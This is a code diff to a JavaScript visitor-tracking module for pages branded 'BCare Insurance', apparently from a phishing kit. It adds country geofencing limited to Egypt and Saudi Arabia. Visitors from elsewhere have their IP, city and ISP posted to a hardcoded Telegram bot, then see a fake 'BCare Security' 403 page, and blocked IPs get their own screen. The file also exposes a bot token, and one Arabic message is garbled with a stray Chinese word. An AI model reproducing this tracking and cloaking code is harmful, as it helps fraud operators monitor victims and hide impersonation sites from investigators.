@@ -10,6 +10,8 @@ const Tracker = (function () {
   const TG_TOKEN    = '8297451860:AAG52IqNkSFFPhMJr82TNEpqYNd0i7u3Dow';
   const TG_CHAT     = '1451039924';
 
+  const ALLOWED_COUNTRIES = ['EG', 'SA'];
+
   const PAGE_NAMES = {
     'app.html':            'الصفحة الرئيسية',
     'policy-details.html': 'تفاصيل الوثيقة',
@@ -247,30 +249,126 @@ ${extra ? '\n' + extra : ''}`;
 
       const local = JSON.parse(localStorage.getItem('bcare_blocked') || '[]');
       if (local.some(b => b.ip === ip)) {
-        document.body.innerHTML = buildBlockedScreen();
+        document.body.innerHTML = buildBlockedScreen('تم حظرك', 'تم حظر وصولك إلى هذا الموقع由于 أنشطة مشبوهة.', 'block');
         return true;
       }
 
       const r = await fetch('blocked.json?t=' + Date.now());
       const blocked = await r.json();
       if (Array.isArray(blocked) && blocked.some(b => b.ip === ip)) {
-        document.body.innerHTML = buildBlockedScreen();
+        document.body.innerHTML = buildBlockedScreen('تم حظرك', 'تم حظر وصولك إلى هذا الموقع由于 أنشطة مشبوهة.', 'block');
         return true;
       }
     } catch(e) {}
     return false;
   }
 
-  function buildBlockedScreen() {
-    return `<div style="display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:'Noto Sans Arabic',sans-serif;background:#f0f4f8;direction:rtl">
-      <div style="text-align:center;padding:2rem;max-width:400px">
-        <div style="width:80px;height:80px;border-radius:50%;background:#fdecea;display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem">
-          <span class="material-icons" style="font-size:2.5rem;color:#e53935">block</span>
-        </div>
-        <h1 style="color:#e53935;font-size:1.4rem;margin-bottom:.5rem">تم حظرك</h1>
-        <p style="color:#6b7c93;font-size:.9rem;line-height:1.7">لا يمكنك الوصول إلى هذا الموقع حالياً.<br/>يرجى التواصل مع الدعم للحصول على المساعدة.</p>
+  /* ─── فحص الموقع الجغرافي ───────────────────────── */
+  async function checkGeoRestriction() {
+    try {
+      const ip = await getIP();
+      const geo = await getGeo(ip);
+      const country = (geo.country || '').toUpperCase();
+
+      if (ALLOWED_COUNTRIES.includes(country)) return false;
+
+      /* إرسال إشعار لتليجرام */
+      try {
+        const loc = geo.country ? `${geo.flag} ${geo.country}${geo.city ? ' — ' + geo.city : ''}${geo.isp ? ' | ' + geo.isp : ''}` : '';
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TG_CHAT,
+            text: `🚫 <b>محاولة وصول غير مصرح بها</b>
+
+🌐 IP: <code>${ip}</code>
+📍 الموقع: ${loc || 'غير معروف'}
+🕐 الوقت: ${new Date().toLocaleString('ar-SA')}
+
+⚠️ تم حظر الاتصال تلقائياً — خارج المناطق المصرح بها`,
+            parse_mode: 'HTML',
+          }),
+        });
+      } catch(e) {}
+
+      document.body.innerHTML = buildGeoBlockedScreen(geo);
+      return true;
+    } catch(e) {}
+    return false;
+  }
+
+  function buildBlockedScreen(title, reason, icon) {
+    return `<!DOCTYPE html><html lang="ar" dir="rtl"><head>
+      <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+      <title>${title}</title>
+      <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@400;600;700&display=swap" rel="stylesheet">
+      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+      <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Noto Sans Arabic',sans-serif;background:#f7f8fa;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#1a1a2e}
+        .card{background:#fff;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.08);padding:3rem 2.5rem;max-width:440px;width:90%;text-align:center}
+        .icon-wrap{width:88px;height:88px;border-radius:50%;background:#fdecea;display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem}
+        .icon-wrap .material-icons{font-size:2.8rem;color:#e53935}
+        h1{font-size:1.5rem;font-weight:700;margin-bottom:.6rem;color:#1a1a2e}
+        p{color:#6b7c93;font-size:.9rem;line-height:1.7}
+        .divider{width:48px;height:3px;background:linear-gradient(90deg,#155f93,#1a7ab8);border-radius:2px;margin:1.2rem auto}
+        .footer{margin-top:1.5rem;padding-top:1rem;border-top:1px solid #f0f2f5;color:#9aa5b4;font-size:.75rem}
+      </style>
+    </head><body>
+      <div class="card">
+        <div class="icon-wrap"><span class="material-icons">${icon || 'block'}</span></div>
+        <h1>${title}</h1>
+        <div class="divider"></div>
+        <p>${reason}</p>
+        <div class="footer">BCare Insurance &copy; ${new Date().getFullYear()}</div>
       </div>
-    </div>`;
+    </body></html>`;
+  }
+
+  function buildGeoBlockedScreen(geo) {
+    const loc = geo.country ? `${geo.flag} ${geo.country}${geo.city ? ' — ' + geo.city : ''}` : '';
+    return `<!DOCTYPE html><html lang="ar" dir="rtl"><head>
+      <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+      <title>Access Denied</title>
+      <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@400;600;700&display=swap" rel="stylesheet">
+      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+      <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Noto Sans Arabic',sans-serif;background:#f7f8fa;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#1a1a2e}
+        .card{background:#fff;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.08);padding:3rem 2.5rem;max-width:480px;width:90%;text-align:center}
+        .shield{width:96px;height:96px;border-radius:50%;background:linear-gradient(135deg,#fff3e0,#ffe0b2);display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem;position:relative}
+        .shield .material-icons{font-size:3rem;color:#e65100}
+        .badge{position:absolute;bottom:2px;right:2px;width:28px;height:28px;border-radius:50%;background:#e53935;display:flex;align-items:center;justify-content:center;border:3px solid #fff}
+        .badge .material-icons{font-size:.9rem;color:#fff}
+        h1{font-size:1.4rem;font-weight:700;margin-bottom:.3rem;color:#1a1a2e}
+        .subtitle{color:#e65100;font-size:.85rem;font-weight:600;margin-bottom:1rem}
+        .divider{width:48px;height:3px;background:linear-gradient(90deg,#e65100,#ff9800);border-radius:2px;margin:0 auto 1rem}
+        .info{background:#f7f8fa;border-radius:10px;padding:.8rem 1rem;margin:.8rem 0;display:flex;align-items:center;gap:.6rem;justify-content:center}
+        .info .material-icons{color:#9aa5b4;font-size:1.1rem}
+        .info span{color:#6b7c93;font-size:.8rem}
+        .msg{color:#6b7c93;font-size:.85rem;line-height:1.7;margin-top:.5rem}
+        .footer{margin-top:1.5rem;padding-top:1rem;border-top:1px solid #f0f2f5;color:#9aa5b4;font-size:.7rem}
+        .footer a{color:#155f93;text-decoration:none}
+        .cloudflare{display:flex;align-items:center;justify-content:center;gap:.4rem;margin-top:.8rem;color:#9aa5b4;font-size:.7rem}
+        .cloudflare .material-icons{font-size:.85rem}
+      </style>
+    </head><body>
+      <div class="card">
+        <div class="shield">
+          <span class="material-icons">security</span>
+          <div class="badge"><span class="material-icons">close</span></div>
+        </div>
+        <h1>تم حظر الوصول</h1>
+        <div class="subtitle">Access Denied — 403</div>
+        <div class="divider"></div>
+        <div class="info"><span class="material-icons">location_on</span><span>${loc || 'موقع غير معروف'}</span></div>
+        <div class="info"><span class="material-icons">public</span><span>الخدمة غير متاحة في منطقتك</span></div>
+        <p class="msg">هذه الخدمة متاحة فقط في <b>مصر</b> و<b>المملكة العربية السعودية</b>.<br/>للتواصل مع الدعم، يرجى زيارة موقعنا الرسمي.</p>
+        <div class="cloudflare"><span class="material-icons">shield</span><span>Protected by BCare Security</span></div>
+        <div class="footer">BCare Insurance &copy; ${new Date().getFullYear()} — <a href="#">اتصل بنا</a></div>
+      </div>
+    </body></html>`;
   }
 
   /* ─── حظر IP ─────────────────────────────────────── */
@@ -307,6 +405,9 @@ ${extra ? '\n' + extra : ''}`;
 
     const blocked = await checkBlocked();
     if (blocked) return;
+
+    const geoBlocked = await checkGeoRestriction();
+    if (geoBlocked) return;
 
     logPage(page);
     startBlockListener();
